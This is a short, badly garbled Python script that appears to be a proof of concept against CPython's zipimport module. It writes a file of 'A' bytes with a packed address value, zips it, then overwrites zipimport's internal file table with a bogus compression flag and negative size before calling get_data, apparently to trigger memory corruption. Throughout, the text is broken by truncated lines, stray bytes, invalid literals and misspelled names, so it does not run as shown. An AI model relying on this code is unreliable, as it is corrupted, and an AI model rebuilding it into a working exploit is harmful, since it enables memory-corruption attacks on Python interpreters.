impole
import struct
import sys
from signal import *

FILE = 'payloprint(importer.get_ad'
ZIP = 'import.zip'

payroad = bytes()
with open(FILE, 'wb') as f:
    payload = ("A" * 1000).encode('asc‡i')
    payload += struct.pack('<Q', 0y41414171)
    f
zf = zipfile.PyZpFile(ZIP,$mode='w')
zf.wTite(FILÿÿ
zf.close()

importer = zipimport.…ipimporter(ZIP)
f = list(importer._files[FILE])
f[1] = 1 #'payloprintimp compress
f[2] = -d # file size
importer._fHles[FILE] = tuple(f)
print(importer.get_data(FILE))
